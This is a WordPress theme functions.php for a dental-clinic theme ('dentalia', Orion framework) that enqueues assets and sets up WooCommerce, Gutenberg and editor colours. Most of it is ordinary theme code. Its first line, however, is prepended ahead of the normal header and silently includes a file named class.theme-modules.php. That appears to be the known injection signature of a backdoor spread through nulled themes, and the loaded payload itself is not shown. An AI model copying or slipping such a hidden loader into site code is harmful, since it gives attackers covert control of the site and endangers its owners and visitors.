<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php // Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) exit; 

/* define root path */
define('ORION_ROOT', get_template_directory_uri());

/*
* Theme setup
*/
/* helper functions*/
require_once( get_template_directory() . '/framework/helpers.php' );
/* builder functions*/
require_once( get_template_directory() . '/framework/sobuilder.php' );
/* option framework*/
require_once( get_template_directory() . '/framework/admin/admin-init.php' );
/* theme init*/
require_once( get_template_directory() . '/framework/init.php' );
/* create sidebars*/
require_once( get_template_directory() . '/framework/sidebars.php' );
/* create metaboxes*/
require_once( get_template_directory() . '/framework/meta/orion_meta_2.php');
/* site origin specific */
require_once( get_template_directory() . '/widgets/orion_so_filters.php' );

/*
* Tiny MCS specific:
*/
function orion_tinymce_style() {
    add_editor_style( '/framework/css/tiny_mce_styles.css' );
}
add_action( 'admin_init', 'orion_tinymce_style' );

/*
* Mega Menu
*/
if (orion_get_option('orion_megamenu', false) == true) {
    if(is_admin()) {
        include_once(get_template_directory() . '/framework/megamenu.php');
    } else {
        include_once(get_template_directory() . '/framework/orion-walker.php');
    }
}

/* shortcodes */
include_once(get_template_directory() . '/framework/shortcodes.php');

/*
* Admin scripts
*/
function orion_admin_scripts($hook) {
    $css_folder = 'css';
    if( orion_get_option('use_minified_css', false) == true) {
        $css_folder = 'css-min';
    }    
    if (orion_get_option('orion_megamenu', false) == true) {
      wp_enqueue_script( 'orion-megamenu', get_template_directory_uri(). '/framework/js/megamenu.js' );      
    }    
    wp_enqueue_script( 'orion_posts_admin', get_template_directory_uri(). '/framework/js/admin.js' );
    wp_enqueue_style( 'orion-admin', get_template_directory_uri(). '/' . $css_folder . '/admin.css' );
    wp_enqueue_style( 'fontawesome', get_template_directory_uri(). '/libs/font-awesome/css/font-awesome.min.css' );    
}
add_action( 'admin_enqueue_scripts', 'orion_admin_scripts' );

/*
* Enqueue script for customizer.
*/

function orion_customizer_scripts() {
    wp_enqueue_script( 'orion_admin', get_template_directory_uri(). '/framework/js/admin.js' );
}
add_action( 'customize_preview_init', 'orion_customizer_scripts' );

/*
* Front end scripts
*/
function orion_frontend_scripts($hook) {
    $css_folder = 'css';
    if( orion_get_option('use_minified_css', false) == true) {
        $css_folder = 'css-min';
    }    
    // third-party styles
    wp_enqueue_style( 'bootstrap', get_template_directory_uri(). '/libs/bootstrap/css/bootstrap.min.css' );	

    if ( is_rtl() ) {
        wp_enqueue_style( 'bootstrap-rtl', get_template_directory_uri(). '/libs/bootstrap-rtl/bootstrap-rtl.min.css' );
        wp_enqueue_style( 'dentalia-rtl', get_template_directory_uri(). '/css/rtl.css' );  
    }

    wp_enqueue_style( 'orionicons', get_template_directory_uri(). '/libs/orionicon/css/style.css' );
    
    if( orion_get_option('load_fa', false) == true) {
         wp_enqueue_style( 'fontawesome', get_template_directory_uri(). '/libs/font-awesome/css/font-awesome.min.css' );   
    }
    if( orion_get_option('load_ei', false) == true) {
         wp_enqueue_style( 'elegant-icons', get_template_directory_uri(). '/libs/elegant_font/HTMLCSS/style-ot-5.css' );
    }     
    
    wp_enqueue_style( 'owl', get_template_directory_uri(). '/libs/owlcarousel/assets/owl.carousel.min.css');
    wp_enqueue_style( 'owl-theme', get_template_directory_uri(). '/libs/owlcarousel/assets/owl.theme.default.min.css');
    wp_enqueue_style( 'swipebox', get_template_directory_uri(). '/libs/swipebox/css/swipebox.min.css' ); 

    // theme style
    wp_enqueue_style( 'dentalia_components', get_template_directory_uri(). '/' . $css_folder . '/components.css' );
    wp_style_add_data( 'dentalia_components', 'rtl', 'replace' );

    if(get_option( 'orion_theme_option_css', 'false' ) != 'false') {
        wp_add_inline_style( 'dentalia_components' , get_option('orion_theme_option_css') );
    } else {
        wp_enqueue_style( 'orion-redux', get_template_directory_uri(). '/framework/css/orion-redux.css', false, rand(1, 99999) );
        if(get_option('dentalia', 'load-css') == 'load-css' || !function_exists("dentalia_activate") ) {
            wp_enqueue_style( 'default-options', get_template_directory_uri(). '/' . $css_folder . '/default-options.css' ); 
        }
    }
    /* in case plugin isn't active, we need additional styling */
    if (!function_exists("dentalia_activate")) {
        wp_enqueue_style( 'default-css', get_template_directory_uri(). '/' . $css_folder . '/default-css.css' );
        wp_enqueue_style( 'orion-g-fonts', orion_googlefonts(), array(), null  );
    }
    if ( class_exists( 'WooCommerce' ) ) {
        wp_enqueue_style( 'orion-woo', get_template_directory_uri(). '/' . $css_folder . '/woo.css' );
    } 
    // also add theme option custom CSS
    $orion_options = get_option('dentalia', '' );
    if($orion_options != '' && array_key_exists("orion_custom_css_editor", $orion_options) && $orion_options["orion_custom_css_editor"] != '' && $orion_options["orion_custom_css_editor"]!= false) {
        wp_add_inline_style( 'dentalia_components' , $orion_options["orion_custom_css_editor"] );
    }
    /* load new page builder CSS */
    wp_enqueue_style( 'new-so-css', get_template_directory_uri(). '/' . $css_folder . '/page-builder.css' );
    
    // third-party scripts
    wp_enqueue_script( 'bootstrap', get_template_directory_uri(). '/libs/bootstrap/js/bootstrap.min.js', array( 'jquery' ) );
    wp_enqueue_script( 'smooth-scroll', get_template_directory_uri(). '/libs/smoothscroll/jquery.smooth-scroll.min.js',array('jquery'), '', true );
	wp_enqueue_script( 'owl', get_template_directory_uri(). '/libs/owlcarousel/owl.carousel.min.js', array( 'jquery' ) );
    wp_enqueue_script( 'tab-collapse', get_template_directory_uri(). '/libs/tab-collapse/bootstrap-tabcollapse.js', array( 'jquery', 'bootstrap' ) );
    wp_enqueue_script( 'waypoints', get_template_directory_uri(). '/libs/waypoints/jquery.waypoints.min.js', 'jQuery');
    wp_enqueue_script( 'waypoints-inview', get_template_directory_uri(). '/libs/waypoints/shortcuts/inview.js', 'waypoints');
    wp_enqueue_script( 'waypoints-sticky', get_template_directory_uri(). '/libs/waypoints/shortcuts/sticky.js', 'waypoints'); 
    wp_enqueue_script( 'swipebox', get_template_directory_uri(). '/libs/swipebox/js/jquery.swipebox.min.js', 'jQuery'); 

    // theme scripts
    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
        wp_enqueue_script( 'comment-reply' );
    }
    if( orion_get_option('use_minified_css', false) == true) {
        wp_enqueue_script( 'dentalia_functions', get_template_directory_uri(). '/js/functions.js', array( 'jquery' ) );
    }  else { 
        wp_enqueue_script( 'dentalia_functions', get_template_directory_uri(). '/dev-js/functions.js', array( 'jquery' ) );
    }
}
add_action( 'wp_enqueue_scripts', 'orion_frontend_scripts' );

/*image sizes */
add_image_size( 'orion_container_width', 1140, 640, true );
add_image_size( 'orion_carousel', 750, 500, true );
add_image_size( 'orion_tablet', 750 );
add_image_size( 'orion_square', 750 , 750, true );

add_filter( 'image_size_names_choose', 'orion_custom_sizes' );
function orion_custom_sizes( $sizes ) {
    return array_merge( $sizes, array(
        'orion_container_width' => esc_html__( 'Container width', 'dentalia' ),
        'orion_carousel' => esc_html__( '3:2 ratio', 'dentalia' ),
        'orion_tablet' => esc_html__( 'Tablet width', 'dentalia' ),
        'orion_square' => esc_html__( 'Square', 'dentalia' ),
    ) );
}   

/* add support for excerpt on pages */ 
function orion_page_excerpt() {
    add_post_type_support( 'page', 'excerpt' );
}
add_action( 'init', 'orion_page_excerpt' );

/* revolution remove anoying notices and not used metaboxes */ 
if ( is_admin() ) {
    function orion_remove_revolution_slider_meta_boxes() {
        remove_meta_box( 'mymetabox_revslider_0', 'page', 'normal' );
        remove_meta_box( 'mymetabox_revslider_0', 'post', 'normal' );
        remove_meta_box( 'mymetabox_revslider_0', 'Team', 'normal' );
    }

    add_action( 'do_meta_boxes', 'orion_remove_revolution_slider_meta_boxes' );
}

// disable HTML5 calender
add_filter( 'wpcf7_support_html5_fallback', '__return_true' );

/* Woocommerce */
if ( class_exists( 'WooCommerce' ) ) { 
    require_once( get_template_directory() . '/framework/woo.php' );
}

add_action( 'after_setup_theme', 'orion_woocommerce_support' );
function orion_woocommerce_support() {
    add_theme_support( 'woocommerce' );
    add_theme_support( 'wc-product-gallery-zoom' );
    add_theme_support( 'wc-product-gallery-lightbox' ); 
    add_theme_support( 'wc-product-gallery-slider' );
}

remove_action( 'woocommerce_before_shop_loop', 'woocommerce_result_count', 20 );
add_action( 'woocommerce_before_shop_loop', 'woocommerce_result_count', 40 );


/* Show excerpt on posts by default */
add_filter('default_hidden_meta_boxes','orion_hide_meta_box',10,2);
function orion_hide_meta_box($hidden, $screen) {
    if ('post' == $screen->base){
        $hidden = array('slugdiv','postcustom','trackbacksdiv', 'commentstatusdiv', 'commentsdiv', 'authordiv', 'revisionsdiv');
    }
    return $hidden;
}

/* before - after */

function orion_enqueue_before_after() {  
wp_enqueue_script( 'jquery-event-move', get_template_directory_uri(). '/libs/twentytwenty/js/jquery.event.move.js', array( 'jquery' ) );
wp_enqueue_script( 'twentytwenty-js', get_template_directory_uri(). '/libs/twentytwenty/js/jquery.twentytwenty.js', array( 'jquery-event-move' ) );
wp_enqueue_style( 'twentytwenty-css', get_template_directory_uri(). '/libs/twentytwenty/css/twentytwenty.css' );

}
function orion_set_before_after() {
    add_action( 'orion_footer', 'orion_enqueue_before_after' );
}

/* Remove the Redux from Dashboard Menu */
function orion_remove_redux_menu() {
    remove_submenu_page('tools.php','redux-about');
}
add_action( 'admin_menu', 'orion_remove_redux_menu',12 );


/* GUTENBERG */
/* load preview styles for gutenberg (and classic) editor */
function orion_frontend_scripts_lite($hook) {
    $css_folder = 'css-min';  
    // third-party styles
    wp_enqueue_style( 'bootstrap', get_template_directory_uri(). '/libs/bootstrap-just-grid/grid-b3.css' );   
    wp_enqueue_style( 'owl', get_template_directory_uri(). '/libs/owlcarousel/assets/owl.carousel.min.css');
    wp_enqueue_style( 'owl-theme', get_template_directory_uri(). '/libs/owlcarousel/assets/owl.theme.default.min.css');
    // theme style
    wp_enqueue_style( 'dentalia_components', get_template_directory_uri(). '/' . $css_folder . '/components-backend.css' );
    if(get_option( 'orion_theme_option_css', 'false' ) != 'false') {
        wp_add_inline_style( 'dentalia_components' , get_option('orion_theme_option_css') );
    } else {
        wp_enqueue_style( 'orion-redux', get_template_directory_uri(). '/framework/css/orion-redux.css', false, rand(1, 99999) );
    }
    wp_enqueue_style( 'orionicons', get_template_directory_uri(). '/libs/orionicon/css/style.css' );
    // also add theme option custom CSS
    $orion_options = get_option('dentalia', '' );
    if($orion_options != '' && array_key_exists("orion_custom_css_editor", $orion_options) && $orion_options["orion_custom_css_editor"] != '' && $orion_options["orion_custom_css_editor"]!= false) {
        wp_add_inline_style( 'dentalia_components' , $orion_options["orion_custom_css_editor"] );
    }
    /* load new page builder CSS */
    wp_enqueue_style( 'new-so-css', get_template_directory_uri(). '/' . $css_folder . '/page-builder.css' );
    
    // third-party scripts
    wp_enqueue_script( 'owl', get_template_directory_uri(). '/libs/owlcarousel/owl.carousel.min.js', array( 'jquery' ) );
    wp_enqueue_script( 'bootstrap', get_template_directory_uri(). '/libs/bootstrap/js/bootstrap.min.js', array( 'jquery' ) );
    wp_enqueue_script( 'tab-collapse', get_template_directory_uri(). '/libs/tab-collapse/bootstrap-tabcollapse.js', array( 'jquery', 'bootstrap' ) );
    wp_enqueue_script( 'smooth-scroll', get_template_directory_uri(). '/libs/smoothscroll/jquery.smooth-scroll.min.js',array('jquery'), '', true );    
    wp_enqueue_script( 'swipebox', get_template_directory_uri(). '/libs/swipebox/js/jquery.swipebox.min.js', 'jQuery');     
    // theme scripts
    if( orion_get_option('use_minified_css', false) == true) {
        wp_enqueue_script( 'dentalia_functions', get_template_directory_uri(). '/js/functions.js', array( 'jquery' ) );
    }  else { 
        wp_enqueue_script( 'dentalia_functions', get_template_directory_uri(). '/dev-js/functions.js', array( 'jquery' ) );
    }    
}
// Preview without Gutenberg is currently in experimental stage.
// to enable it, just uncomment the actions below:
// add_action( 'admin_print_scripts-post-new.php', 'orion_frontend_scripts_lite', 11 );
// add_action( 'admin_print_scripts-post.php', 'orion_frontend_scripts_lite', 11 );

add_action( 'enqueue_block_editor_assets', 'orion_frontend_scripts_lite', 11 );



/* Prepare Google fonts */
if(!function_exists('orion_googlefonts')) {
    function orion_googlefonts() {
        $font_families = array();
        $font_families[] = 'Open Sans:400,700';
        $font_families[] = 'Montserrat:400,700';

        $query_args = array(
            'family' => urlencode( implode( '|', $font_families ) ),
            'subset' => urlencode( 'latin,latin-ext' ),
        );
        $fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
      
        // developers: if you would like to modify fonts in gutenberg, you can also call all fonts ina a single url:
        //  $gurl = 'https://fonts.googleapis.com/css?family=Montserrat:400,700|Open+Sans:400,700&display=swap&subset=latin-ext';
        
        //  and then return it with:
        // return esc_url_raw( $gurl );

        return esc_url_raw( $fonts_url );
        
    }
}

/* load style fixes which are caused by importing bootstrap etc into backend */
function orion_wp_backend_styling($hook) {
    wp_enqueue_style( 'dentalia-editor-styling', get_template_directory_uri(). '/css-min/gutenberg_style.css' );   
    wp_enqueue_style( 'orion-g-fonts', orion_googlefonts(), array(), null  );
}

// Preview without Gutenberg is currently in experimental stage.
// to enable it, just uncomment the actions below:
// add_action( 'admin_print_scripts-post-new.php', 'orion_wp_backend_styling', 11 );
// add_action( 'admin_print_scripts-post.php', 'orion_wp_backend_styling', 11 );

add_action( 'enqueue_block_editor_assets', 'orion_wp_backend_styling', 11 );

// Orion JS functions for the Gutenberg editor
function orion_admin_gutenberg_scripts($hook) {
    wp_enqueue_script(
        'orion_admin_gutenberg',
        get_template_directory_uri(). '/framework/js/admin-gutenberg.js',
        array(
            'wp-api',
            'wp-components',
            'jquery',
            'wp-blocks',
            'wp-element',
            'wp-data',
        )
    );
}
add_action( 'enqueue_block_editor_assets', 'orion_admin_gutenberg_scripts' );


function orion_setup_theme_supported_features() {
    $color_1 = orion_get_theme_option_css('main_theme_color', '#00BCD4' );
    $color_2 = orion_get_theme_option_css('secondary_theme_color', '#3F51B5' );
    $color_3 = orion_get_theme_option_css('color_3', '#2B354B' );

    add_theme_support( 'editor-color-palette', array(
        array(
            'name' => __( 'Primary', 'dentalia' ),
            'slug' => 'primary',
            'color' => $color_1,
        ),
        array(
            'name' => __( 'Secondary', 'dentalia' ),
            'slug' => 'secondary',
            'color' => $color_2,
        ),
        array(
            'name' => __( 'Tertiary', 'dentalia' ),
            'slug' => 'tertiary',
            'color' => $color_3,
        ),
        array(
            'name' => __( 'White', 'dentalia' ),
            'slug' => 'white',
            'color' => '#fff',
        ),
        array(
            'name' => __( 'Black', 'dentalia' ),
            'slug' => 'black',
            'color' => '#000',
        ),
    ) );
}

add_action( 'after_setup_theme', 'orion_setup_theme_supported_features' );

// load orion widgets for gutenberg (only if needed)
if (class_exists ( 'Orion_Widgets_Bundle_Block' ) && class_exists ( 'Orion_Widgets_Bundle_Block' )) {
    Orion_Widgets_Bundle_Block::single();
}

/* Set Revolution Slider as Theme */
if(function_exists( 'orion_set_rev_as_theme' )){
    add_action( 'init', 'orion_set_rev_as_theme' );
    function orion_set_rev_as_theme() {
        set_revslider_as_theme();
    }
}

